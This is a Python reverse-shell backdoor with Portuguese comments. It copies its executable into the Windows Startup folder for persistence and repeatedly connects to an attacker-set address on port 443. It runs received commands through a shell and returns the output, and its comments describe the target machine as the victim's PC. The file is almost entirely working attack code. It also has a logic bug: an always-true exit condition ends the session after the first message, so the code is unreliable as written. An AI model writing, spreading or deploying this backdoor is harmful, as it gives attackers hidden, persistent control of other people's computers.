import socket
import time
import subprocess
import os
import threading

# MUDE ISSO
ip = '0.0.0.0'
porta = 443


def autorunWindows():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system(f"copy {exe_filename} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")

def connectar(ip, porta):
    try:
        # Faz uma conexao TCP no IP e na porta especificados
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, porta))
        return client
    except:
        pass

def comando(client, data):
    try:
        # Basicamente vai executar comando na shell do computador e vai mandar o resultado pro servidor do atacante
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        client.send(proc.stdout.read() + proc.stderr.read() + b"\n")
    except:
        pass

def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            # Parte onde eu vou colocar os comandos que o atacante vai conseguir rodar no PC da vitima
            if data == "/sair" or "exit":
                client.send("Colocando a shell em background, quando quiser voltar eh so abrir a porta denovo :)\n".encode())
                return
            elif data == "":
                client.send("O comando recebido esta vazio\n".encode())
            elif "sudo" in data:
                client.send("Nao tem permissao para usar o sudo\n".encode())
            else:
                threading.Thread(target=comando, args=(client, data)).start()
            
    except:
        pass

if __name__ == "__main__":
    # Se o sistema operacional que estiver rodando isso for um Windows, ele vai pra pasta de Startup
    if os.name == "nt":
        autorunWindows()
    while True:
        # Vai ficar eternamente criando a conexao ate que o programa seja fechado (o esperado eh que nao seja fechado nunca ne)
        client = connectar(ip, porta)
        if client:
            client.send("Conexao iniciada, pode usar a shell xD \n".encode())
            listen(client)

        else:
            # print("deu erro, tentando dnv em 5 segundos")
            time.sleep(1)
